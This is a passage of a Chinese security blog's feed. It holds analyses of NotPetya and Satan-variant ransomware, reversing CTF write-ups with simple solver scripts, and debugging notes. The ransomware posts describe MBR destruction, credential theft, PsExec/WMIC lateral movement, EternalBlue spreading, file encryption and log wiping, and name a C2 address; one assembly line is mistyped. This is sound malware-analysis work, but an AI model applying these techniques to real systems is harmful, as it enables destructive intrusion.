      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术(16) ---NotPetya勒索病毒</title>
    <link href="http://yoursite.com/2018/11/08/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_16_NotPetya/"/>
    <id>http://yoursite.com/2018/11/08/病毒分析技术_16_NotPetya/</id>
    <published>2018-11-08T03:02:11.000Z</published>
    <updated>2018-11-15T11:19:59.011Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NotPetya是源自类似Petya的全新形式勒索病毒，可以将硬盘整个加密和锁死，从内存或者本地文件系统里提取密码。[源自于百度百科]</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本篇分析的关于MBR修改一节部分参照了前辈maydayRn 的分析结果。<br><a id="more"></a></p><h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.目录</li><li>2.样本信息</li><li>3.行为分析</li><li>4.样本分析</li><li>5.技术总结<!-- more --></li></ul><h1 id="二：样本信息"><a href="#二：样本信息" class="headerlink" title="二：样本信息"></a>二：样本信息</h1><ul><li>1.样本名称：efegfeisjwi.exe</li><li>2.样本md5：71b6a493388e7d0b40c83ce903bc6b04</li><li>3.是否加壳：无壳</li><li>4.编译语言：vc++</li><li>5.样本来源：来自于网络收集</li></ul><h1 id="三：行为分析"><a href="#三：行为分析" class="headerlink" title="三：行为分析"></a>三：行为分析</h1><ul><li>行为分析：<br>  <img src="https://i.imgur.com/jang9la.png" alt=""></li></ul><h1 id="四：样本分析"><a href="#四：样本分析" class="headerlink" title="四：样本分析"></a>四：样本分析</h1><h2 id="模块1：感染初始化"><a href="#模块1：感染初始化" class="headerlink" title="模块1：感染初始化"></a>模块1：感染初始化</h2><ul><li>概括<br>  <img src="https://i.imgur.com/o465sp0.png" alt=""></li><li>提升权限，需要将进程权限提高到关机权限，调试权限，操作系统级权限<br>  <img src="https://i.imgur.com/ldBeUZR.png" alt=""></li><li>排除指定的安全软件进程<br>  <img src="https://i.imgur.com/nSvsbLH.png" alt=""></li><li>将装载器读入进程堆空间<br>  <img src="https://i.imgur.com/EwMuzeO.png" alt=""></li></ul><h2 id="模块2：隐匿自身"><a href="#模块2：隐匿自身" class="headerlink" title="模块2：隐匿自身"></a>模块2：隐匿自身</h2><ul><li>将自身复制到进程空间<br>  <img src="https://i.imgur.com/TnbMyNR.png" alt=""></li><li>设置堆的保护属性<br>  <img src="https://i.imgur.com/AEmsjjA.png" alt=""></li><li>卸载自身dll，删除dll文件，达到隐藏自身的目的<br>  <img src="https://i.imgur.com/ViNR4sk.png" alt=""><br>  <img src="https://i.imgur.com/ThfKM2t.png" alt=""></li></ul><h2 id="模块3：恶意破坏"><a href="#模块3：恶意破坏" class="headerlink" title="模块3：恶意破坏"></a>模块3：恶意破坏</h2><ul><li>使用调试权限，破坏MBR<br>  <img src="https://i.imgur.com/47f4jFi.png" alt=""></li><li>搜索之前的文件是否存在，如果存在退出进程，否则重新创建新的<br>  <img src="https://i.imgur.com/8aNKq8m.png" alt=""><br>  <img src="https://i.imgur.com/oZKpWZ0.png" alt=""></li><li>修改C盘前10个扇区内存<br>  <img src="https://i.imgur.com/AMGEHda.png" alt=""></li><li>修改MBR设备文件<ul><li>产生随机码并写入MBR<br><img src="https://i.imgur.com/J7OGpNe.png" alt=""><br><img src="https://i.imgur.com/qI0B7TG.png" alt=""></li><li>加密MBR数据，对MBR0x200字节进行xor 0x7操作<br><img src="https://i.imgur.com/f8AEXj2.png" alt=""><br><img src="https://i.imgur.com/x7rEd8B.png" alt=""></li></ul></li></ul><h2 id="模块4：设置定时任务"><a href="#模块4：设置定时任务" class="headerlink" title="模块4：设置定时任务"></a>模块4：设置定时任务</h2><ul><li>获取shutdown.exe的路径，利用system权限创建定时任务，任务为重启，时间为在当前时间后1hour<br>  <img src="https://i.imgur.com/zN5nAMr.png" alt=""><br>  <img src="https://i.imgur.com/p15D0sy.png" alt=""><br>  <img src="https://i.imgur.com/I3LI1ay.png" alt=""><br>  <img src="https://i.imgur.com/66kwYW6.png" alt=""></li></ul><h2 id="模块5：获取IP表"><a href="#模块5：获取IP表" class="headerlink" title="模块5：获取IP表"></a>模块5：获取IP表</h2><ul><li>复制本地计算机IP到IP地址表<br>  <img src="https://i.imgur.com/kVnwnQj.png" alt=""><br>  <img src="https://i.imgur.com/zVM0JWd.png" alt=""></li><li>将获取到的适配器和IP地址以及DHCP地址对应起来<br>  <img src="https://i.imgur.com/lQVwpYd.png" alt=""></li><li>判断系统是否是DHCP服务器<br>  <img src="https://i.imgur.com/Nm3QKvW.png" alt=""></li><li>获取子网中的IP地址，并将IP放在IP表中<br>  <img src="https://i.imgur.com/Yl5dSUQ.png" alt=""><br>  <img src="https://i.imgur.com/rqeM4nN.png" alt=""><br>  <img src="https://i.imgur.com/EB3h9h7.png" alt=""></li><li>利用枚举出来的IP表，暴力链接目标IP的445和139端口，将可以利用IP保存起来<br>  <img src="https://i.imgur.com/6Z1ARe3.png" alt=""><br>  <img src="https://i.imgur.com/mCyDBna.png" alt=""><br>  <img src="https://i.imgur.com/ToLWXG2.png" alt=""></li><li>利用TCP节点表获取目标的IP<br>  <img src="https://i.imgur.com/mZz8dna.png" alt=""><br>  <img src="https://i.imgur.com/NMvsOzA.png" alt=""></li></ul><h2 id="模块6：释放密码抓取程序"><a href="#模块6：释放密码抓取程序" class="headerlink" title="模块6：释放密码抓取程序"></a>模块6：释放密码抓取程序</h2><ul><li>释放资源文件到临时目录<br>  <img src="https://i.imgur.com/7648Smv.png" alt=""><br>  <img src="https://i.imgur.com/z0bfh5q.png" alt=""></li><li>将CLSID作为管道名称创建管道，利用之前释放的资源文件获取用户密码，然后通过管道，交给后续远程登录机器。<br>  <img src="https://i.imgur.com/sJv4wuU.png" alt=""><br>  <img src="https://i.imgur.com/SodgjRF.png" alt=""><br>  <img src="https://i.imgur.com/zdS2Sx5.png" alt=""></li><li>创建刚刚释放的文件GetPasswd.exe进程。获取用户密码，然后与远程登录进程共享。<br>  <img src="https://i.imgur.com/MnVeId9.png" alt=""></li><li>删除刚刚释放的文件，保证不被查杀<br>  <img src="https://i.imgur.com/YWs3DUH.png" alt=""></li></ul><h2 id="模块7：释放远程执行程序"><a href="#模块7：释放远程执行程序" class="headerlink" title="模块7：释放远程执行程序"></a>模块7：释放远程执行程序</h2><ul><li>释放PsExec文件<br>  <img src="https://i.imgur.com/XoPzHX3.png" alt=""></li></ul><h2 id="模块8：远程加载恶意dll"><a href="#模块8：远程加载恶意dll" class="headerlink" title="模块8：远程加载恶意dll"></a>模块8：远程加载恶意dll</h2><ul><li>枚举网络资源，获取用户登陆凭证，收入密码表。创建网络连接，利用Psexec和wmic远程执行命令<br>  <img src="https://i.imgur.com/ycr2uwr.png" alt=""></li><li>枚举网络资源。<br>  <img src="https://i.imgur.com/3fTgbVc.png" alt=""><br>  <img src="https://i.imgur.com/Zp8dZc6.png" alt=""></li><li>获取用户的登录凭证，排除TERMSRV，后面的字符就是允许保存计算机远程终端凭证<br>  <img src="https://i.imgur.com/XLKgZ9C.png" alt=""></li><li>将IP表和登录凭据表对应<br>  <img src="https://i.imgur.com/mJGqKns.png" alt=""></li><li>创建网络连接，检查之前释放的Psexec文件是否存在，不存在重新写入文件<br>  <img src="https://i.imgur.com/YdrIa4K.png" alt=""><br>  <img src="https://i.imgur.com/yq0FFHx.png" alt=""></li><li>利用Psexec远程执行恶意dll<br>  <img src="https://i.imgur.com/9OMRu6r.png" alt=""></li><li>利用wmic远程执行恶意dll<br>  <img src="https://i.imgur.com/zLxQAoV.png" alt=""></li><li>创建上传命令的进程<br>  <img src="https://i.imgur.com/QNKi3Ec.png" alt=""></li></ul><h2 id="模块9：永恒之蓝漏洞传播"><a href="#模块9：永恒之蓝漏洞传播" class="headerlink" title="模块9：永恒之蓝漏洞传播"></a>模块9：永恒之蓝漏洞传播</h2><ul><li>利用永恒之蓝和永恒浪漫传播<br>  <img src="https://i.imgur.com/45HxgXg.png" alt=""></li></ul><h2 id="模块10：加密文件"><a href="#模块10：加密文件" class="headerlink" title="模块10：加密文件"></a>模块10：加密文件</h2><ul><li>理论上判断所有硬盘，使用RSA和AES加密。<br>  <img src="https://i.imgur.com/B6jxsfR.png" alt=""><br>  <img src="https://i.imgur.com/FeKarXy.png" alt=""></li><li>遍历目录，除了C://windows目录不加密，加密后缀为如下：<br>  <img src="https://i.imgur.com/dmzycT3.png" alt=""></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="number">3</span>ds.<span class="number">7</span>z<span class="selector-class">.accdb</span><span class="selector-class">.ai</span><span class="selector-class">.asp</span><span class="selector-class">.aspx</span><span class="selector-class">.avhd</span><span class="selector-class">.back</span><span class="selector-class">.bak</span><span class="selector-class">.c</span><span class="selector-class">.cfg</span><span class="selector-class">.conf</span><span class="selector-class">.cpp</span><span class="selector-class">.cs</span>&gt;</div><div class="line">&lt;<span class="selector-class">.ctl</span><span class="selector-class">.dbf</span><span class="selector-class">.disk</span><span class="selector-class">.djvu</span><span class="selector-class">.doc</span><span class="selector-class">.docx</span><span class="selector-class">.dwg</span><span class="selector-class">.eml</span><span class="selector-class">.fdb</span><span class="selector-class">.gz</span><span class="selector-class">.h</span><span class="selector-class">.hdd</span><span class="selector-class">.kdbx</span><span class="selector-class">.mai</span>&gt;</div><div class="line">&lt;l<span class="selector-class">.mdb</span><span class="selector-class">.msg</span><span class="selector-class">.nrg</span><span class="selector-class">.ora</span><span class="selector-class">.ost</span><span class="selector-class">.ova</span><span class="selector-class">.ovf</span><span class="selector-class">.pdf</span><span class="selector-class">.php</span><span class="selector-class">.pmf</span><span class="selector-class">.ppt</span><span class="selector-class">.pptx</span><span class="selector-class">.pst</span><span class="selector-class">.pv</span>&gt;</div><div class="line">&lt;<span class="selector-tag">i</span><span class="selector-class">.py</span><span class="selector-class">.pyc</span><span class="selector-class">.rar</span><span class="selector-class">.rtf</span><span class="selector-class">.sln</span><span class="selector-class">.sql</span><span class="selector-class">.tar</span><span class="selector-class">.vbox</span><span class="selector-class">.vbs</span><span class="selector-class">.vcb</span><span class="selector-class">.vdi</span><span class="selector-class">.vfd</span><span class="selector-class">.vmc</span><span class="selector-class">.vmd</span>&gt; &lt;k<span class="selector-class">.vmsd</span><span class="selector-class">.vmx</span><span class="selector-class">.vsdx</span><span class="selector-class">.vsv</span><span class="selector-class">.work</span><span class="selector-class">.xls</span><span class="selector-class">.xlsx</span><span class="selector-class">.xvd</span><span class="selector-class">.zip</span>.&gt;</div></pre></td></tr></table></figure><ul><li>根据文件大小，使用不同的加密策略<br>  <img src="https://i.imgur.com/wZvdxBE.png" alt=""></li><li>利用文件映射的方式使用AES加密方式进行文件加密<br>  <img src="https://i.imgur.com/oVpp6Gh.png" alt=""></li><li>创建勒索提示信息README<br>  <img src="https://i.imgur.com/8qj5zgT.png" alt=""></li></ul><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><ul><li>生成AES加密秘钥对<br>  <img src="https://i.imgur.com/ObMgOg8.png" alt=""></li><li>利用AES加密文件<br>  <img src="https://i.imgur.com/6xWXiyr.png" alt=""></li><li>导入内置的RSA公钥<br>  <img src="https://i.imgur.com/yUpiUL9.png" alt=""><br>  <img src="https://i.imgur.com/PUc1MkE.png" alt=""></li><li>利用RSA公钥加密AES秘钥，并导出<br>  <img src="https://i.imgur.com/yqLecv7.png" alt=""><br>  <img src="https://i.imgur.com/eSGGl6Z.png" alt=""></li><li>写入AES秘钥<br>  <img src="https://i.imgur.com/gsN33Q9.png" alt=""></li></ul><h2 id="模块11：清除日志"><a href="#模块11：清除日志" class="headerlink" title="模块11：清除日志"></a>模块11：清除日志</h2><ul><li>利用cmd调用wevtutil清除相关日志信息<br>  <img src="https://i.imgur.com/ajgQhvX.png" alt=""><br>  <img src="https://i.imgur.com/i3TnkcZ.png" alt=""></li></ul><h2 id="模块12：诱发蓝屏"><a href="#模块12：诱发蓝屏" class="headerlink" title="模块12：诱发蓝屏"></a>模块12：诱发蓝屏</h2><ul><li>调用NtRaiseHardError诱发蓝屏<br>  <img src="https://i.imgur.com/ELu6Ci6.png" alt=""></li></ul><h1 id="五-技术总结"><a href="#五-技术总结" class="headerlink" title="五 技术总结"></a>五 技术总结</h1><h2 id="分析1：隐匿自身"><a href="#分析1：隐匿自身" class="headerlink" title="分析1：隐匿自身"></a>分析1：隐匿自身</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一类勒索病毒(GrandCrab，NotPetya)都有着很强的隐匿手段，而且采用的并不是普通的隐匿手段(DLL注入)，而是将PE文件直接写入内存，然后修正导入表实现的。这样可以实现文件不落地，避免被查杀。</p><ul><li>获取文件MZ头，并读取到进程空间<br>  <img src="https://i.imgur.com/5tiS7Io.png" alt=""></li><li>搜索重定位表<ul><li>根据PE结构的相关知识，可得知<code>SectionHeader = *(_WORD *)(this + 20) + this + 24;// NtHeader</code>其实是获取节区头。</li><li>然后获取了节区的数目，<code>NumberOfSection = *(_WORD *)(this + 6);       // NumberOfSection=NtHeader+6</code></li><li>接着遍历节区，目的是为了获取reloc节区<br><img src="https://i.imgur.com/X9jTjmx.png" alt=""><br><img src="https://i.imgur.com/n0hZV9k.png" alt=""></li></ul></li><li>卸载自身，将源文件写入全零，然后删除自身文件(此时代码在进程中执行)<br>  <img src="https://i.imgur.com/p0rjHgf.png" alt=""><br>  <img src="https://i.imgur.com/GwYyYrk.png" alt=""><br>  <img src="https://i.imgur.com/kXvqyR6.png" alt=""></li><li>接着修复导入函数地址表<br>  <img src="https://i.imgur.com/FUZPXrZ.png" alt=""><br>  <img src="https://i.imgur.com/yWPzYyB.png" alt=""></li><li>最后跳转到新的函数入口点<br>  <img src="https://i.imgur.com/EgGv5MB.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;NotPetya是源自类似Petya的全新形式勒索病毒，可以将硬盘整个加密和锁死，从内存或者本地文件系统里提取密码。[源自于百度百科]&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;本篇分析的关于MBR修改一节部分参照了前辈maydayRn 的分析结果。&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术_15_sata勒索病毒</title>
    <link href="http://yoursite.com/2018/09/10/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_15_sata%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
    <id>http://yoursite.com/2018/09/10/病毒分析技术_15_sata勒索病毒/</id>
    <published>2018-09-10T02:45:11.000Z</published>
    <updated>2018-09-10T09:56:41.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.目录</li><li>2.样本信息</li><li>3.样本分析</li><li>4.技术总计<a id="more"></a></li></ul><h1 id="二：样本信息"><a href="#二：样本信息" class="headerlink" title="二：样本信息"></a>二：样本信息</h1><ul><li>1.病毒名称：sta.exe</li><li>2.样本md5： ECF5CABC81047B46977A4DF9D8D68797</li><li>3.是否加壳：有壳MPRESS v2.12</li><li>4.编译语言：VC(待定，查壳器无法判断)</li><li>5.样本来源：c&amp;c服务器[服务器关闭]</li></ul><h1 id="三：样本分析"><a href="#三：样本分析" class="headerlink" title="三：样本分析"></a>三：样本分析</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先病毒运行时，先创建了一个名为<code>SATANAPP</code>的互斥体。<br>    <img src="https://i.imgur.com/dtbNuJ7.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建c:\Temp\KSession文件，作为文件加密硬件信息。创建”C:\_How_to_decrypt_files.txt”提示信息。<br>    <img src="https://i.imgur.com/LJPSuGO.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;提示信息主要含有三种语言，英语中文，韩文(日文？不知道)，以及给出的作者BTC钱包地址和邮箱地址，以及硬件ID信息<br>    <img src="https://i.imgur.com/hsmsNBk.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着将生成的指纹信息，利用HTTP协议发送到服务器101.99.84.136。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着是三个文件加密模块，第二个是主要加密数据库类型文件，第三个是加密所有文件。<br>    <img src="https://i.imgur.com/yjOBong.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序首先会排除如图的目录和文件后缀。<br>    <img src="https://i.imgur.com/K5tmvJm.png" alt=""><br>    <img src="https://i.imgur.com/zKTBQQC.png" alt=""><br>    <img src="https://i.imgur.com/OilvDii.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据函数CryptDeriveKey发现这个样本的加密算法但是DES加密算法，属于对称加密。所以解密会相对容易一点。<br>    <img src="https://i.imgur.com/uMgDoBR.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;加密完成后，把对应的公钥发送给服务器端。然后利用notepad打开提示信息。<br>    <img src="https://i.imgur.com/U81cLPa.png" alt=""><br>    <img src="https://i.imgur.com/k7nqJPB.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;与撒旦病毒最开始的样本不同此次变种只是在加密文件末尾附加了HardID和PUBLIC信息<br>    <img src="https://i.imgur.com/aMI85K0.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.目录&lt;/li&gt;
&lt;li&gt;2.样本信息&lt;/li&gt;
&lt;li&gt;3.样本分析&lt;/li&gt;
&lt;li&gt;4.技术总计
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>WhaleCTF</title>
    <link href="http://yoursite.com/2018/09/06/WhaleCTF/"/>
    <id>http://yoursite.com/2018/09/06/WhaleCTF/</id>
    <published>2018-09-06T06:02:11.000Z</published>
    <updated>2018-09-10T03:31:45.894Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;流程非常简单，接收输入，然后与0xE进行异或，最后与<code>LDYVLQMZHuY:|cQ[^Qyo|cQ{~QYO\CQ[^/s</code>比较。<br>   <img src="https://i.imgur.com/ymjsE1T.png" alt=""></p><a id="more"></a><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述很简单的写出一个脚本，但是有一个字符有点文件，如果直接复制上述字符串“\”，编译器可能将它识别成转义字符，所以我们需要将它提出来重新运算。<br>    <img src="https://i.imgur.com/6MtEjya.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重运算结果上，明显看到这个“\”符号没有参与运算。最后利用ASCII编码运算，以下是脚本<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">char</span> str[]=<span class="string">"LDYVLQMZHuY:|cQ[^Qyo|cQ&#123;~QYO\CQ[^/s\0"</span>;</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(str);i++)</div><div class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>,str[i]^<span class="number">0xE</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\n%c"</span>,<span class="number">0X5c</span>^<span class="number">0xE</span>);   <span class="comment">//补倒数第七位字符</span></div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="comment">//BJWXB_CTF&#123;W4rm_UP_warm_up_WARM_UP!&#125;</span></div></pre></td></tr></table></figure></p><h2 id="R100"><a href="#R100" class="headerlink" title="R100"></a>R100</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elf文件，查壳没有发现异常。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;流程也很简单，接收输入，然后验证输入，正确的话ok。<br>    <img src="https://i.imgur.com/6RJe3zt.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;发现验证函数里面是个二维数组，使得input和数组如下关系即可：<code>if ( (&amp;v3)[i % 3][2 * (i / 3)] - *(char *)(i + input) != 1 )</code><br>     <img src="https://i.imgur.com/pEKFfVm.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;写出脚本即可<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">char</span> v3[<span class="number">3</span>][<span class="number">7</span>]=</div><div class="line">&#123;&#123;<span class="string">'D'</span>,<span class="string">'u'</span>,<span class="string">'f'</span>,<span class="string">'h'</span>,<span class="string">'b'</span>,<span class="string">'m'</span>,<span class="string">'f'</span>&#125;,</div><div class="line">         &#123;<span class="string">'p'</span>,<span class="string">'G'</span>,<span class="number">0x60</span>,<span class="string">'i'</span>,<span class="string">'m'</span>,<span class="string">'o'</span>,<span class="string">'s'</span>&#125;,</div><div class="line"> &#123;<span class="string">'e'</span>,<span class="string">'w'</span>,<span class="string">'U'</span>,<span class="string">'g'</span>,<span class="string">'l'</span>,<span class="string">'p'</span>,<span class="string">'t'</span>&#125;&#125;;</div><div class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">11</span>;i++)</div><div class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>,v3[i % <span class="number">3</span>][<span class="number">2</span> * (i / <span class="number">3</span>)] <span class="number">-1</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="comment">//Code_Talkers</span></div></pre></td></tr></table></figure></p><h2 id="逆向练习"><a href="#逆向练习" class="headerlink" title="逆向练习"></a>逆向练习</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查壳。未发现异常</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查看流程如下：接收输入，然后进入sub_411136编码，但是经过动态调试，发现这个函数返回原输入。然后打印输入，接着和一个全局变量<code>KfxEeft}f{gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\0087138</code>前17位比较，最后加上1204}即可，这是IDA分析的结果。<br>    <img src="https://i.imgur.com/52Mk2VA.png" alt=""><br>    <img src="https://i.imgur.com/bjvlLEC.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是，进过动态调式发现，上述的字符串只是取其中的一部分，而且这部分没有规律。一步一步调试，最终发现flag。这道题关键是如何下断点是比较困难的。<br>    <img src="https://i.imgur.com/0a7UjD2.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后加上<code>1024}</code>即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Re&quot;&gt;&lt;a href=&quot;#Re&quot; class=&quot;headerlink&quot; title=&quot;Re&quot;&gt;&lt;/a&gt;Re&lt;/h1&gt;&lt;h2 id=&quot;Warmup&quot;&gt;&lt;a href=&quot;#Warmup&quot; class=&quot;headerlink&quot; title=&quot;Warmup&quot;&gt;&lt;/a&gt;Warmup&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;流程非常简单，接收输入，然后与0xE进行异或，最后与&lt;code&gt;LDYVLQMZHuY:|cQ[^Qyo|cQ{~QYO\CQ[^/s&lt;/code&gt;比较。&lt;br&gt;   &lt;img src=&quot;https://i.imgur.com/ymjsE1T.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>&lt;格蠹汇编&gt;_第29章_在调试中细品CPU</title>
    <link href="http://yoursite.com/2018/09/04/%E3%80%8A%E6%A0%BC%E8%A0%B9%E6%B1%87%E7%BC%96%E3%80%8B_%E7%AC%AC29%E7%AB%A0_%E5%9C%A8%E8%B0%83%E8%AF%95%E5%99%A8%E4%B8%AD%E7%BB%86%E5%93%81CPU/"/>
    <id>http://yoursite.com/2018/09/04/《格蠹汇编》_第29章_在调试器中细品CPU/</id>
    <published>2018-09-04T07:02:11.000Z</published>
    <updated>2018-09-04T08:22:28.907Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引用栈上的变量"><a href="#引用栈上的变量" class="headerlink" title="引用栈上的变量"></a>引用栈上的变量</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在函数入口处会执行以下代码,这样子函数的栈底就是父函数栈顶。在ebp值上面的空间就是子函数需要使用的栈空间，下面是父函数使用的栈空间。所以<strong>ebp+正数代表的是传入子函数的参数，ebp+负数代表的是子函数的局部变量。</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">push</span> <span class="built_in">esp</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></div></pre></td></tr></table></figure></p><h2 id="淡化段机制"><a href="#淡化段机制" class="headerlink" title="淡化段机制"></a>淡化段机制</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;操作系统大都使用分页机制作为内存管理的主要手段，这是因为段机制是不可禁止的，同时考虑到软件的兼容性，只能淡化段机制的作用。比如讲段基地址设置为0，边界设置为最大，再如共享段描述符。让不同的进程使用相同的段描述符，这就是调试不同的程序但是其段地址是相同的了。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每个CPU都有自己的<strong>全局描述表(GDT)</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如下图，后面的数值表示的是段描述符在全局描述表的位置，<strong>当段选择子的第三位全部置零后得到对应的段描述符的偏移值。</strong>例如在cs的值为0x1b，但是对应的段描述符表的偏移则是0x18，对应的就是全局描述符表的KGDT_R3_CODE.<br>    <img src="https://i.imgur.com/cLzQ0F8.png" alt=""></p><h2 id="特殊的FS段"><a href="#特殊的FS段" class="headerlink" title="特殊的FS段"></a>特殊的FS段</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;windows中FS寄存器有特殊的用法，当CPU在内核中运行时，FS指向的是PCR，当CPU在用户态运行时，FS指向的是TEB。利用<code>dg命令</code>可以查看段描述信息。如下可以发现，使用dg 